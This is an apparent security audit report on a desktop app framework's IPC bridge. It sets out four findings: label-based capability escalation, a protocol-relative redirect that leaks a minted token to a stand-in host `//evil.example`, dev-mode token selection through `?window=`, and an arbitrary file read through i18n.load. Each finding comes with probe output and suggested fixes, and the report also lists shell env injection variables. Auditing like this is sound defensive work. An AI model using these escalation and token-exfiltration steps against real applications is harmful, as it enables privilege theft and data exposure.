# Hunt 22 — security: capabilities, tokens, paths, injection

Read-only. HEAD `2174a6d`. No source changed. Four findings: two token/capability edges in the
built bridge, one in the dev Vite path, one arbitrary-file read through `i18n`. Probes ran from
the approved temp dir; no GUI launch, no cursor movement.

## F1 (HIGH) — `window.create` with a bridge-owned absolute URL mints a `main`-authority document token, so `window:create` alone can cross capability labels

- `src/plugins/window-create.ts:59,62-73` — any absolute URL whose origin equals the recorded bridge
  (`isBridgeOrigin`) takes the `bridgeOwned` branch. `appDocument()` calls `withoutWindowLabel(url)`,
  which **strips every `?window=`** and adds none, then appends the process seed with `withToken`.
  The native label (`parsed.options.label`) is used only for the adapter's `create` and duplicate
  check (`window-create.ts:80-85`); it never reaches the URL.
- `src/bridge/server/handler.ts:83-97` — the document route reads `label = windowLabelFromSearch(url.search)`.
  With `window=` stripped, `label` is `undefined`; `mintDocumentToken(ledger, label)` defaults to
  `DEFAULT_WINDOW_LABEL` = `"main"` (`src/bridge/server/document-tokens.ts:43-48`,
  `src/bridge/window-identity.ts:31`). That token's label is the sole authority for the capability
  gate (`handler.ts:189-192`, `src/bridge/server/invoke.ts:70-73`).
- Reached: a page whose document token is bound to `worker` and whose only grant is `window:create`
  calls `crust.invoke("window", "create", { label: "child", url: location.origin + "/x" })`. The
  child window is tracked as `child` but its document token is minted for `main`. Any privileged
  capability held by `main` is now reachable from a page that never held it. No seed is needed by
  the page: `window.create` appends it.
- Measured: `createWindowCommand` with `url = "http://127.0.0.1:63410//evil.example/x"` produced
  `{"label":"worker-child","url":"http://127.0.0.1:63410//evil.example/x?token=SEED-TOKEN"}`
  (no `window=`), via a temp probe calling the real `createWindowCommand` with a fake adapter.
  A bridge started with `capabilities: [{worker:["window:create"]},{main:["test:*"]}]` and
  `grants: {worker:["worker"],main:["main"]}` served that path with the seed, 302'd to a minted
  token, and `POST /_crust/invoke` with that token returned `200 {"ok":true,"result":{"proved":true}}`
  for `test:echo` (temp probe, no repo files touched).
- Scope: built app (`crust dev` records no token, `src/runtime.ts:152`). This is the still-open
  simple variant of hunt-20/19-security §HIGH; the `?window=admin` spelling was closed by
  `withoutWindowLabel`, the fallback to `main` was not.
- Smallest fix: in `appDocument()`, when `bridgeOwned`, force the native label into the query the
  same way `withForcedWindowLabel` does for relative URLs. Do not rely on a page-readable query for
  authority; carry the native label out of band and refuse to mint when they disagree.

## F2 (HIGH, still open) — protocol-relative redirect sends the freshly minted token to a foreign origin, and that token carries `main` authority

- `src/bridge/server/handler.ts:90-97` — the 302 builds `location` as
  `` `${location.pathname}${location.search}${location.hash}` ``. A path beginning `//` is a
  protocol-relative URL; the minted document token is placed in that relative `Location`.
- Reached by the same `window.create` call as F1 with `url = location.origin + "//evil.example/x"`.
  `bridgeOwned` is true, `withoutWindowLabel` keeps the path, the seed is appended, the top-level
  GET has no `Origin`, so `serveDocument` mints and redirects to
  `//evil.example/x?token=<minted>`. The WebView follows it off-origin. The minted token is bound
  to `main` (F1), not to an unauthorised `undefined` as hunt-50/36 assumed.
- Measured: `curl --path-as-is` against the real bridge returned `HTTP/1.1 302` with
  `Location: //evil.example/x?token=<uuid>`. `fetch` normalises the double slash in its own URL
  parser and showed `/evil.example/x?...`, so a browser-level `fetch` probe alone misses the leak;
  the native navigation uses the URL string from `windowUrl` byte-exact. The leaked token answered
  `test:echo` with `200` under the configured `main` grant (same temp probe as F1).
- This is hunt-50/36 finding 1, reported against HEAD `356ea2a`; it is unchanged at `2174a6d`.
  Bridge lane 01 explicitly deferred it as a prior finding, so it is recorded here as still open.
- Smallest fix: never emit a relative `Location` built from a raw pathname. Reject paths starting
  with `//` (or `\`), or emit an absolute `http://127.0.0.1:<port>/...` Location built from a
  normalised path, before any token is minted.

## F3 (MEDIUM, dev only) — `crust/vite` hands any `?window=<label>` to the page's token selection, so a low-grant dev page can choose a high-grant credential

- `src/vite.ts:73-84,99-100` — `labelOf(ctx)` reads `window` straight from the dev request URL;
  `pageToken = tokens?.[label] ?? token`. The handshake carries one token per configured window
  label (`src/runtime-host.ts:81-91`), so the query parameter decides which bearer credential is
  injected into the served HTML.
- `src/bridge/window-identity.ts:15-19` states that a label is a routing hint, never authority;
  here the page-supplied label is the only selector of authority. The built-app path was hardened
  (F1's sibling), the dev path was not.
- Reached: with `security.capabilities` configured and two configured windows (`worker` low,
  `admin` high), a page under `crust dev` navigates to `http://localhost:5173/?window=admin`. Vite
  serves the same app HTML with the admin token in `window.__CRUST__`; every later invoke has
  `admin` grants. An XSS in the low-privilege window is enough, as is any page on the dev origin
  that can open that URL. No configured window has to exist in the caller's own frame.
- Measured/evidence: `src/bridge/dev-label-token.test.ts:66-84` asserts that
  `?window=main` and `?window=admin` receive different tokens and that the admin token serves the
  document; `bun test src/bridge/dev-label-token.test.ts` → 2 pass, 0 fail. The test treats the
  escalation as the intended fix for hunt-20's dev mint, but it also proves the label is
  page-controlled.
- Smallest fix: stop selecting credentials from a page-supplied query. Tie the injected token to a
  server-side fact about the window that requested the document (or mint one token per dev origin
  with identical grants), and refuse a `?window=` that claims a label the dev server did not bind.

## F4 (MEDIUM) — `i18n.load` reads arbitrary directories and returns their JSON, bypassing `fs.scope` and the `fs` capability

- `src/plugins/i18n.ts:119-125` — `load` is a page-callable command taking `args.directory` with no
  validation and no scope check; it merges the loader's result into the live catalogue.
- `src/plugins/i18n-load.ts:17-47` — `readdir(directory)` then `readFile(join(directory, file))` for
  every `*.json`; any absolute path or `..` walk is accepted. `i18n.messages`
  (`i18n.ts:86-95`) returns the whole table for a named locale, and `translate` returns one value.
- Reached: a page granted `i18n:load` and `i18n:messages` — with **no** `fs` capability and no
  `fs.scope` prefix — calls `crust.invoke("i18n", "load", { directory: "/some/other/app/data" })`
  then `crust.invoke("i18n", "messages", { locale: "store" })`, reading JSON files outside the
  app's data root. The path is not canonicalised, so a symlink inside an allowed directory is also
  followed. This is a separate read primitive from `fs`, which has `scope.check` on every path
  (`src/plugins/fs.ts:100-107`) and refuses its own scope store (`fs-scope.ts:129-137`).
- Measured: temp probe created `/tmp/hunt22-i18n-*/secret.json` with `{ token: "HUNT22-SECRET-VALUE" }`,
  called `createI18nPlugin().commands.load({ directory: dir })` then `commands.messages({ locale: "secret" })`.
  Answer: `{"ok":true,"locale":"secret","messages":{"token":"HUNT22-SECRET-VALUE"}}`.
- Smallest fix: route the loader through `fs.scope` (`await scope.check(await canonical(args.directory))`)
  before `readdir`, and reject a relative directory, the scope store's path, and symlinks that
  canonicalise outside the configured prefixes. Host code that loads its bundled catalogue can
  pass a loader that does not go through the page-callable command.

## Checked and clean (read)

- Capability compilation (`src/bridge/server/capabilities.ts:77-108`): no config → `OPEN`;
  non-empty table denies by default; `allows(undefined, …)` is false; the label is taken from the
  token map, never the invoke body (`handler.ts:188-192`). `actions.ts:30-43` checks both
  `app:<name>` and the wire `app:invoke`, so a narrow grant cannot be widened by renaming.
- `patternMatches` (`src/plugins/network-match.ts:23-45`): one `*` metacharacter, anchored ends, no
  regexp on the main thread. Case folding off for command actions (`capabilities.ts:68-70`).
- `fs.scope` (`fs-scope.ts:129-137`, `fs-scope-path.ts:29-49`): `realpath` before prefix compare,
  dangling links resolved, `..` left for the OS to fold, separator-aware sibling rejection, store
  path refused even when unscoped. `preview.show` inherits that scope (`preview.ts:106-116`).
- `store` / `database` / `downloads` / `logging.configure` / `crash-reporter.configure` name and
  path rules (`store-scope.ts:28-34`, `database-name.ts:39-65`, `downloads-scope.ts:68-82`,
  `logging-configure.ts:64-78`, `crash-reporter.ts:64-93`): tokens, not paths; canonical containment
  where a directory is accepted.
- `shell` (`shell-args.ts:52-125`, `shell-resolve.ts:133-175`, `shell-env.ts:39-70`): argv arrays to
  `Bun.spawn` with no shell string; program realpath-checked against the allow list; page `env`
  refused without host opt-in, injection names folded on Windows. The denylist still omits
  `NODE_PATH`, `PYTHONPATH`, `PERL5LIB`, `RUBYLIB`, `GIT_SSH_COMMAND`, `PHPRC`, `PATH`
  (hunt-20/04-shell-sidecar.md, unchanged) — no new instance claimed here.
- `updater` (`updater-download.ts:36-69`, `updater-url.ts:22-43`, `updater-slip.ts:25-114`):
  mandatory sha256, https only unless opt-in, pinned pubkey when configured, zip names/symlinks
  checked before extraction. Token ledger, CSP nonce and referrer policy unchanged from prior
  reviews; no new defect found in `src/bridge/server/{csp,events,body,http,assets}.ts`.
